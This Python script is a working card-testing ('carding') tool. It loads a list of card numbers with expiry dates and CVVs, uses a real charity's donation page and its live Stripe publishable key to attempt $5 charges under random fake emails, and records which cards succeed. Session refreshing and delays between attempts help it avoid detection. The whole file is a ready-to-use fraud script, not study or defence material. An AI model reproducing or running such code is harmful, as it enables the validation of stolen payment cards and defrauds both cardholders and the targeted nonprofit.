import requests
import re
import json
import random
import string
import time
import os
import sys
from datetime import datetime

class CardChecker:
    def __init__(self):
        self.session = requests.Session()
        self.base_url = "https://swop.ourpowerbase.net"
        self.csrf_token = None
        self.user_agent = "Mozilla/5.0 (Linux; Android 13; 22011119TI Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.6998.39 Mobile Safari/537.36"
    
    def start_new_session(self):
        try:
            self.session = requests.Session()
            
            headers = {
    "Host": "swop.ourpowerbase.net",
    "Connection": "keep-alive",
    "sec-ch-ua": '"Chromium";v="134", "Not:A-Brand";v="24", "Android WebView";v="134"',
    "sec-ch-ua-mobile": "?1",
    "sec-ch-ua-platform": '"Android"',
    "Upgrade-Insecure-Requests": "1",
    "User-Agent": self.user_agent,
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "dnt": "1",
    "X-Requested-With": "mark.via.gp",
    "Sec-Fetch-Site": "none",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-User": "?1",
    "Sec-Fetch-Dest": "document",
    "Accept-Encoding": "gzip, deflate, br, zstd",
    "Accept-Language": "en-IN,en-US;q=0.9,en;q=0.8"
            }
            
            url = f"{self.base_url}/civicrm/contribute/transact?reset=1&id=25"
            response = self.session.get(url, headers=headers)
            csrf_match = re.search(r'"csrfToken":"(.*?)"', response.text)
            
            if csrf_match:
                self.csrf_token = csrf_match.group(1)
                print(f"Session started. CSRF Token: {self.csrf_token}")
                return True
            else:
                print("Failed to obtain CSRF token")
                return False
        except Exception as e:
            print(f"Error starting session: {str(e)}")
            return False

    def generate_random_email(self):
        username = ''.join(random.choice(string.ascii_lowercase) for _ in range(10))
        domains = ["gmail.com", "yahoo.com", "outlook.com", "hotmail.com"]
        domain = random.choice(domains)
        return f"{username}@{domain}"

    def normalize_card_format(self, card_line):
        try:
            parts = card_line.strip().split('|')
            if len(parts) != 4:
                return None
            
            cc, mm, yy_or_yyyy, cvv = parts
            yy = yy_or_yyyy[-2:] if len(yy_or_yyyy) == 4 else yy_or_yyyy
            return f"{cc}|{mm}|{yy}|{cvv}"
        except Exception:
            return None

    def check_card(self, card_data):
        try:
            parts = card_data.split('|')
            if len(parts) != 4:
                return {"status": "error", "message": "Invalid card format"}
            
            card_number, exp_month, exp_year, cvv = parts
            
            stripe_url = "https://api.stripe.com/v1/payment_methods"
            stripe_headers = {
    "Host": "api.stripe.com",
    "content-length": "3695",
    "sec-ch-ua-platform": "\"Android\"",
    "user-agent": self.user_agent,
    "accept": "application/json",
    "sec-ch-ua": "\"Chromium\";v=\"134\", \"Not:A-Brand\";v=\"24\", \"Android WebView\";v=\"134\"",
    "content-type": "application/x-www-form-urlencoded",
    "sec-ch-ua-mobile": "?1",
    "origin": "https://js.stripe.com",
    "x-requested-with": "mark.via.gp",
    "sec-fetch-site": "same-site",
    "sec-fetch-mode": "cors",
    "sec-fetch-dest": "empty",
    "referer": "https://js.stripe.com/",
    "accept-encoding": "gzip, deflate, br, zstd",
    "accept-language": "en-IN,en-US;q=0.9,en;q=0.8",
    "priority": "u=1, i"
            }
            
            data = {
    "type": "card",
    "card[number]": card_number,
    "card[cvc]": cvv,
    "card[exp_month]": exp_month,
    "card[exp_year]": f"20{exp_year}",
    "billing_details[address][postal_code]": "10006",
    "guid": "NA",
    "muid": "NA",
    "sid": "NA",
    "payment_user_agent": "stripe.js%2Ffd95e0ffd9%3B+stripe-js-v3%2Ffd95e0ffd9%3B+card-element",
    "referrer": "https%3A%2F%2Fswop.ourpowerbase.net",
    "key": "pk_live_51IlzILIj39zbqVwKOfD2RX6n9xe4R4XTRpca1U4I2aLw8an3Fd9jm8DE7rQ3NPciJT0J5Ec7FFrqVuyGxzm4rKCq00VjlFos2d"
            }
            
            stripe_response = self.session.post(stripe_url, headers=stripe_headers, data=data)
            stripe_json = stripe_response.json()
            pm_id = stripe_json.get('id')
            
            if not pm_id:
                error_msg = stripe_json.get('error', {}).get('message', 'Unknown error')
                return {"status": "error", "message": f"Stripe error: {error_msg}", "raw_response": stripe_json}
            
            process_url = f"{self.base_url}/civicrm/ajax/api4/StripePaymentintent/ProcessPublic"
            process_headers = {
    "Host": "swop.ourpowerbase.net",
    "Connection": "keep-alive",
    "Content-Length": "431",
    "sec-ch-ua-platform": "\"Android\"",
    "X-Requested-With": "XMLHttpRequest",
    "User-Agent": self.user_agent,
    "Accept": "*/*",
    "sec-ch-ua": "\"Chromium\";v=\"134\", \"Not:A-Brand\";v=\"24\", \"Android WebView\";v=\"134\"",
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
    "sec-ch-ua-mobile": "?1",
    "Origin": "https://swop.ourpowerbase.net",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "Referer": "https://swop.ourpowerbase.net/civicrm/contribute/transact?reset=1&id=25",
    "Accept-Encoding": "gzip, deflate, br, zstd",
    "Accept-Language": "en-IN,en-US;q=0.9,en;q=0.8"
            }
            
            email = self.generate_random_email()
            params_dict = {
                "paymentMethodID": pm_id,
                "amount": "5.00",
                "currency": "USD",
                "paymentProcessorID": "21",
                "description": "Support The Haven | SWOP PowerBase",
                "extraData": email,
                "csrfToken": self.csrf_token,
                "captcha": ""
            }
            
            process_data = {"params": json.dumps(params_dict)}
            process_response = self.session.post(process_url, headers=process_headers, data=process_data)
            process_json = process_response.json()
            
            return {
                "status": "success" if process_json.get("is_error") == 0 else "declined",
                "card": card_data,
                "message": "Card processed successfully" if process_json.get("is_error") == 0 else "Card declined",
                "raw_response": process_json
            }
            
        except Exception as e:
            return {"status": "error", "message": f"Error processing card: {str(e)}"}

    def process_card_file(self, file_path):
        try:
            if not self.csrf_token:
                print("No active session. Starting a new one...")
                if not self.start_new_session():
                    return
            
            with open(file_path, 'r') as f:
                cards = [line.strip() for line in f if line.strip()]
            
            print(f"Loaded {len(cards)} cards from file.")
            
            results = {
                "total": len(cards),
                "success": 0,
                "declined": 0,
                "error": 0,
                "details": []
            }
            
            for i, card in enumerate(cards):
                print(f"\nProcessing card {i+1}/{len(cards)}: {card}")
                
                normalized_card = self.normalize_card_format(card)
                if not normalized_card:
                    print(f"Invalid card format: {card}")
                    results["error"] += 1
                    results["details"].append({
                        "card": card,
                        "status": "error",
                        "message": "Invalid card format"
                    })
                    continue
                
                if i > 0 and i % 5 == 0:
                    print("Refreshing session...")
                    self.start_new_session()
                    time.sleep(2)
                
                result = self.check_card(normalized_card)
                
                if result["status"] == "success":
                    results["success"] += 1
                    print(f"SUCCESS: {normalized_card}")
                elif result["status"] == "declined":
                    results["declined"] += 1
                    print(f"DECLINED: {normalized_card}")
                else:
                    results["error"] += 1
                    print(f"ERROR: {normalized_card} - {result['message']}")
                
                results["details"].append({
                    "card": normalized_card,
                    "status": result["status"],
                    "message": result.get("message", ""),
                    "raw_response": result.get("raw_response", "")
                })
                
                print(f"JSON Response for {normalized_card}:")
                print(json.dumps(result.get("raw_response", ""), indent=2))
                
                time.sleep(5)
            
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            output_file = f"card_check_results_{timestamp}.json"
            
            with open(output_file, 'w') as f:
                json.dump(results, f, indent=4)
            
            print(f"\nResults saved to {output_file}")
            print("\n===== SUMMARY =====")
            print(f"Total cards: {results['total']}")
            print(f"Successful: {results['success']}")
            print(f"Declined: {results['declined']}")
            print(f"Errors: {results['error']}")
            
            return results
            
        except Exception as e:
            print(f"Error processing card file: {str(e)}")
            return None

def main():
    try:
        checker = CardChecker()
        
        if len(sys.argv) > 1:
            card_file = sys.argv[1]
        else:
            card_file = input("Enter the path to the card list file: ")
        
        if not os.path.exists(card_file):
            print(f"Error: File {card_file} not found.")
            return
        
        if checker.start_new_session():
            checker.process_card_file(card_file)
        else:
            print("Failed to start session")
    except Exception as e:
        print(f"An error occurred: {str(e)}")

if __name__ == "__main__":
    main()